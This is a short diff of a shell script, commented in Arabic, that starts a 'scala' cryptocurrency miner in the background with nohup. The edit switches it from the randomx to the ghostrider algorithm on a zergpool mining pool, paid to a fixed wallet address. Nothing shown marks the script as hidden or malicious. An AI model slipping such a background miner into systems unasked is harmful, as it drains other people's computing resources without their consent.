@@ -19,4 +19,4 @@ tar -xvf scala.tar.gz --strip=1
 rm scala.tar.gz
 
 # تشغيل المعدّن في الخلفية بنواة واحدة
-nohup ./scala -a randomx --url randomx.eu.mine.zergpool.com:4453 --user NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT -p c=XNA  > cpu_output.log 2>&1 &
+nohup ./scala -a ghostrider --url ghostrider.eu.mine.zergpool.com:5354 --user NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT -p c=XNA,mc=FBIT  > cpu_output.log 2>&1 &
